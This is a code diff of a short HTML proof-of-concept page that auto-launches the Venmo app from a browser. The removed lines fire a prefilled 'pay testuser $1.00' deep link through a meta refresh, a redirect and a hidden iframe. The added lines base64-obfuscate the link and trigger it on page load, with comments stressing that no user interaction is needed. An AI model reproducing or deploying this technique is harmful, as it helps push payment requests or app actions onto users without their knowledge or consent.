@@ -3,23 +3,33 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Venmo PoC</title>
+    <title>Venmo App Auto-Open Test</title>
     <script>
-        setTimeout(() => {
-            window.location.href = "venmo://paycharge?txn=pay&recipients=testuser&amount=1.00&note=Testing";
-        }, 100);
+        // Step 1: Base64 Encode Venmo Deep Link (Like Strumzo's Obfuscation)
+        const encodedVenmoURL = "dmVubW86Ly8="; // Decodes to: venmo://
+
+        // Step 2: Inject a Hidden iFrame (Mimicking the Amazon Auto-Launch)
+        function injectIframe() {
+            let iframe = document.createElement("iframe");
+            iframe.style.width = "1px";
+            iframe.style.height = "1px";
+            iframe.style.border = "none";
+            iframe.src = atob(encodedVenmoURL); // Decoding and executing the link
+            document.body.appendChild(iframe);
+        }
+
+        // Step 3: Use window.location.href to Open Venmo Silently
+        function forceOpenVenmo() {
+            window.location.href = atob(encodedVenmoURL); // Instantly launch Venmo app
+        }
+
+        // Step 4: Auto-Execute on Page Load (No User Interaction Required)
+        window.onload = function() {
+            setTimeout(forceOpenVenmo, 100); // Runs almost instantly after page loads
+        };
     </script>
-    <meta http-equiv="refresh" content="0;url=venmo://paycharge?txn=pay&recipients=testuser&amount=1.00&note=Testing">
 </head>
 <body>
-    <h1>Testing Auto App Launch via Safari</h1>
-    <script>
-        setTimeout(() => {
-            let iframe = document.createElement('iframe');
-            iframe.style.display = 'none';
-            iframe.src = "venmo://paycharge?txn=pay&recipients=testuser&amount=1.00&note=Testing";
-            document.body.appendChild(iframe);
-        }, 200);
-    </script>
+    <h1>Testing Venmo Auto-Open</h1>
 </body>
 </html>
